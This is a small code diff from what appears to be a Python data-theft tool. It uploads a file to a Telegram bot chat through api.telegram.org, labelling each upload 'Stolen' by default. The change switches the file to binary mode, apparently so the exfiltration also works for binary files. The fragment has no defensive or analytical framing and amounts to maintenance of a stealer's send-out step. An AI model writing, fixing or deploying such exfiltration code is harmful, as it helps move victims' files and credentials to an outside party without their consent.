@@ -20,7 +20,7 @@ if caption is None or caption == "":
     caption = "Stolen"
 
 url = f"https://api.telegram.org/bot{token}/sendDocument"
-files = {"document": open(args.file, "r")}
+files = {"document": open(args.file, "rb")}
 data = {
     "chat_id": tg_id,
     "caption": caption,
